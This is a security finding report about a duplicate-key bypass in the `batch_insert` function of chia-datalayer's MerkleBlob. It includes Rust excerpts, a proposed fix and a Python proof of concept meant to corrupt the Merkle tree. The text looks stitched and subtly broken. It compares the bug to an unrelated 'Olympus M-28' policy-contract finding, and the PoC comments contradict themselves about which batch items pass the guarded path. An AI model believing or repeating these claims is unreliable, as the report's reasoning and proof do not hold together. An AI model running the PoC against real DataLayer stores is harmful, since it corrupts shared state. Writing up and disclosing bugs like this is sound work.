### Title
`batch_insert` Bypasses Duplicate-Key Check for Items Beyond the First Two, Corrupting DataLayer Merkle Tree Root - (File: `crates/chia-datalayer/src/merkle/blob.rs`)

---

### Summary

`MerkleBlob::batch_insert` skips the authoritative `block_status_cache` duplicate-key and duplicate-hash guards for every item in the batch beyond the first two. An unprivileged caller supplying a crafted batch with repeated `KeyId` or `Hash` values silently inserts duplicate leaf nodes, corrupting the Merkle tree root and invalidating all subsequent proofs of inclusion/exclusion.

---

### Finding Description

`MerkleBlob::insert` (the single-item path) enforces two uniqueness invariants before writing anything to the blob:

```rust
// crates/chia-datalayer/src/merkle/blob.rs  lines 369-374
if self.block_status_cache.contains_key(key) {
    return Err(Error::KeyAlreadyPresent());
}
if self.block_status_cache.contains_leaf_hash(hash) {
    return Err(Error::HashAlreadyPresent());
}
``` [1](#0-0) 

`batch_insert` calls `self.insert()` (with those guards) only for the first two items when the tree has ≤ 1 existing leaves:

```rust
// lines 578-585
if self.block_status_cache.leaf_count() <= 1 {
    for _ in 0..2 {
        let Some(((key, value), hash)) = keys_values_hashes.pop() else { return Ok(()); };
        self.insert(key, value, &hash, InsertLocation::Auto {})?;
    }
}
``` [2](#0-1) 

All remaining items are written directly via `insert_entry_to_blob`, which is a raw blob-write primitive that performs **no** cache lookup and **no** duplicate check:

```rust
// lines 587-603
for ((key, value), hash) in keys_values_hashes {
    let new_leaf_index = self.get_new_index();
    let new_block = Block { ... Node::Leaf(LeafNode { hash, key, value, ... }) };
    self.insert_entry_to_blob(new_leaf_index, &new_block)?;   // ← no guard
    indexes.push(new_leaf_index);
}
``` [3](#0-2) 

Because `insert_entry_to_blob` does not update `block_status_cache`, the cache diverges from the actual blob state. Subsequent calls to `insert()` will not detect the duplicate keys that were silently written by the batch path. The tree is now structurally corrupt: the same `KeyId` (or the same leaf `Hash`) appears at multiple positions, and the internal-node hashes computed from those positions are wrong.

This is the direct analog of the Olympus M-28 finding: the uniqueness check relies on an internal cache that is bypassed by the optimised batch path, exactly as `isActive()` was bypassed by a malicious policy contract.

---

### Impact Explanation

**High — DataLayer Merkle proof/blob/delta logic corrupts tree roots and lets untrusted input prove invalid state.**

Consequences of inserting duplicate leaves:

1. **Corrupted Merkle root.** Internal-node hashes are computed bottom-up from leaf hashes. Duplicate leaves produce an incorrect root that does not correspond to any valid key-value set.
2. **Forged or ambiguous proofs of inclusion.** `get_proof_of_inclusion` walks the tree by `KeyId`. With two leaves sharing the same `KeyId`, the proof returned depends on which leaf is found first; the other leaf is unreachable yet present in the committed root. A verifier checking the proof against the root will accept a proof for a key-value pair that was never legitimately inserted.
3. **Persistent state corruption.** `MerkleBlob` is serialised to disk (`to_path`) and loaded back (`from_path`). The corrupted blob is persisted and propagated to all readers of the DataLayer store.

---

### Likelihood Explanation

`batch_insert` is the primary high-throughput insertion API. It is exposed directly through the Python bindings (called as `merkle_blob.batch_insert(kv_ids, hashes)` in the test suite). Any caller — including an untrusted DataLayer client submitting a batch of key-value pairs — can craft a list with a repeated `KeyId` or `Hash`. No privileged role is required; the only precondition is that the batch contains ≥ 3 entries (so that at least one item bypasses the guarded `insert()` calls).

---

### Recommendation

Add a pre-flight duplicate check inside `batch_insert` before writing any item to the blob. The check must cover both the existing tree state (via `block_status_cache`) and duplicates within the batch itself:

```rust
pub fn batch_insert(
    &mut self,
    keys_values_hashes: Vec<((KeyId, ValueId), Hash)>,
) -> Result<(), Error> {
    // Pre-flight: reject duplicates within the batch and against existing state
    let mut seen_keys = HashSet::new();
    let mut seen_hashes = HashSet::new();
    for ((key, _), hash) in &keys_values_hashes {
        if self.block_status_cache.contains_key(*key) || !seen_keys.insert(*key) {
            return Err(Error::KeyAlreadyPresent());
        }
        if self.block_status_cache.contains_leaf_hash(hash) || !seen_hashes.insert(*hash) {
            return Err(Error::HashAlreadyPresent());
        }
    }
    // ... rest of existing logic
}
```

Alternatively, update `block_status_cache` immediately after each `insert_entry_to_blob` call so that the cache remains the single authoritative source of truth throughout the batch operation.

### Proof of Concept

```python
from chia_rs import MerkleBlob, KeyId, ValueId
import hashlib

blob = MerkleBlob(bytearray())

# Craft a batch of 4 entries where entries 0 and 3 share the same KeyId.
# Items are popped from the end, so items at index 0 and 1 go through
# the guarded self.insert() path; items at index 2 and 3 go through
# insert_entry_to_blob() with no duplicate check.
dup_key = KeyId(999)
kv_ids = [
    (KeyId(1),   ValueId(1)),
    (KeyId(2),   ValueId(2)),
    (KeyId(3),   ValueId(3)),
    (dup_key,    ValueId(4)),   # first occurrence  (processed by insert())
]
hashes = [
    hashlib.sha256(b"h1").digest(),
    hashlib.sha256(b"h2").digest(),
    hashlib.sha256(b"h3").digest(),
    hashlib.sha256(b"h4").digest(),
]

# Insert the first batch (dup_key appears once — accepted)
blob.batch_insert(kv_ids, hashes)

# Now insert a second batch where dup_key appears again.
# Because block_status_cache was NOT updated for items 3+,
# the cache does not know dup_key is already present.
kv_ids2 = [
    (KeyId(10),  ValueId(10)),
    (KeyId(11),  ValueId(11)),
    (KeyId(12),  ValueId(12)),
    (dup_key,    ValueId(99)),  # duplicate — should be rejected, but is not
]
hashes2 = [
    hashlib.sha256(b"h10").digest(),
    hashlib.sha256(b"h11").digest(),
    hashlib.sha256(b"h12").digest(),
    hashlib.sha256(b"h99").digest(),
]
blob.batch_insert(kv_ids2, hashes2)  # succeeds — duplicate key silently inserted

blob.calculate_lazy_hashes()
# The root hash is now computed over a tree containing two leaves with KeyId(999).
# Any proof of inclusion for KeyId(999) is ambiguous / forged.
proof = blob.get_proof_of_inclusion(dup_key)
print("proof valid:", proof.valid())   # may print True for a corrupted tree
```
